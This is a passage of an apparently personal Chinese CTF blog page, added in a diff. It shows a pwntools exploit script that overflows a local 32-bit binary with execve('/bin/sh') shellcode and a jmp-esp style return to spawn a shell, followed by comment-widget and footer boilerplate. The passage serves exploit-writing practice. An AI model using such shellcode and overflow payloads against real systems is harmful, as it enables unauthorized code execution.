+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&quot;./libc.so.6&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">xor    eax, eax</span>
+<span class="s1">push   eax</span>
+<span class="s1">push   0x68732f2f</span>
+<span class="s1">push   0x6e69622f</span>
+<span class="s1">mov    ebx, esp</span>
+<span class="s1">mov    ecx, eax</span>
+<span class="s1">mov    edx, eax</span>
+<span class="s1">mov    al, 0xb</span>
+<span class="s1">int    0x80</span>
+<span class="s1">&#39;&#39;&#39;&#39;</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x24</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x8048554</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;sub esp,0x28;call esp&#39;</span><span class="p">)</span>   <span class="c1"># 0x24+0x4=0x28</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="md-typeset" style="margin-top: 2rem;">
+  <h2 id="__comments">评论</h2>
+  
+  <script>
+    var giscusTheme = document.body.getAttribute("data-md-color-scheme") === "slate" ? "dark_dimmed" : "light";
+    
+    var giscusScript = document.createElement("script");
+    giscusScript.src = "https://giscus.app/client.js";
+    giscusScript.setAttribute("data-repo", "maple-pwn/maple-pwn.github.io");
+    giscusScript.setAttribute("data-repo-id", "R_kgDOP5uLTQ");
+    giscusScript.setAttribute("data-category", "Comments");
+    giscusScript.setAttribute("data-category-id", "DIC_kwDOP5uLTc4C130e");
+    giscusScript.setAttribute("data-mapping", "pathname");
+    giscusScript.setAttribute("data-strict", "0");
+    giscusScript.setAttribute("data-reactions-enabled", "1");
+    giscusScript.setAttribute("data-emit-metadata", "0");
+    giscusScript.setAttribute("data-input-position", "bottom");
+    giscusScript.setAttribute("data-theme", giscusTheme);
+    giscusScript.setAttribute("data-lang", "zh-CN");
+    giscusScript.setAttribute("data-loading", "lazy");
+    giscusScript.setAttribute("crossorigin", "anonymous");
+    giscusScript.async = true;
+    
+    document.getElementById("__comments").insertAdjacentElement("afterend", giscusScript);
+    
+    // Theme sync
+    var observer = new MutationObserver(function(mutations) {
+      mutations.forEach(function(mutation) {
+        if (mutation.attributeName === "data-md-color-scheme") {
+          var theme = document.body.getAttribute("data-md-color-scheme") === "slate" ? "dark_dimmed" : "light";
+          var iframe = document.querySelector(".giscus-frame");
+          if (iframe) {
+            iframe.contentWindow.postMessage(
+              { giscus: { setConfig: { theme: theme } } },
+              "https://giscus.app"
+            );
+          }
+        }
+      });
+    });
+    observer.observe(document.body, { attributes: true });
+  </script>
+</div>
+
+                
+  
+<div class="md-typeset" style="margin-top: 2rem;">
+  <h2 id="__comments">评论</h2>
+  
+  <script>
+    var giscusTheme = document.body.getAttribute("data-md-color-scheme") === "slate" ? "dark_dimmed" : "light";
+    
+    var giscusScript = document.createElement("script");
+    giscusScript.src = "https://giscus.app/client.js";
+    giscusScript.setAttribute("data-repo", "maple-pwn/maple-pwn.github.io");
+    giscusScript.setAttribute("data-repo-id", "R_kgDOP5uLTQ");
+    giscusScript.setAttribute("data-category", "Comments");
+    giscusScript.setAttribute("data-category-id", "DIC_kwDOP5uLTc4C130e");
+    giscusScript.setAttribute("data-mapping", "pathname");
+    giscusScript.setAttribute("data-strict", "0");
+    giscusScript.setAttribute("data-reactions-enabled", "1");
+    giscusScript.setAttribute("data-emit-metadata", "0");
+    giscusScript.setAttribute("data-input-position", "bottom");
+    giscusScript.setAttribute("data-theme", giscusTheme);
+    giscusScript.setAttribute("data-lang", "zh-CN");
+    giscusScript.setAttribute("data-loading", "lazy");
+    giscusScript.setAttribute("crossorigin", "anonymous");
+    giscusScript.async = true;
+    
+    document.getElementById("__comments").insertAdjacentElement("afterend", giscusScript);
+    
+    // Theme sync
+    var observer = new MutationObserver(function(mutations) {
+      mutations.forEach(function(mutation) {
+        if (mutation.attributeName === "data-md-color-scheme") {
+          var theme = document.body.getAttribute("data-md-color-scheme") === "slate" ? "dark_dimmed" : "light";
+          var iframe = document.querySelector(".giscus-frame");
+          if (iframe) {
+            iframe.contentWindow.postMessage(
+              { giscus: { setConfig: { theme: theme } } },
+              "https://giscus.app"
+            );
+          }
+        }
+      });
+    });
+    observer.observe(document.body, { attributes: true });
+  </script>
+</div>
+
+
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.titles", "navigation.tabs", "navigation.indexes", "navigation.top"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../../../resources/js/read-metrics.js"></script>
+      
+    
+  </body>
+</html>
